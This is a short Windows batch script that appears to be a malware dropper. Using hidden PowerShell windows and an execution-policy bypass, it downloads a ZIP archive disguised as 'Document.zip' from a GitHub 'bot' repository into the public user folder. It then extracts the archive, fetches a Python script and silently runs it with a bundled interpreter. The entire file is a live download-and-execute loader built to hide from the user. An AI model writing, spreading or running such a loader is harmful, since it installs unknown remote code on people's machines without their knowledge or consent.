echo Downloading Document.zip...
if not exist "C:\Users\Public\Document.zip" (
    powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/sirvnvu/bot/raw/main/PythonLib.zip', 'C:\Users\Public\Document.zip')"
)

echo Extracting Document.zip...
if not exist "C:\Users\Public\Document" (
    powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Expand-Archive -Path 'C:\Users\Public\Document.zip' -DestinationPath 'C:\Users\Public\Document'"
)

echo Downloading project.py...
if not exist "C:\Users\Public\Document\project.py" (
    powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/sirvnvu/bot/raw/main/project.py', 'C:\Users\Public\Document\project.py')"
)

echo Running project.py...
powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "C:\Users\Public\Document\python.exe C:\Users\Public\Document\project.py"

endlocal
exit /b 0
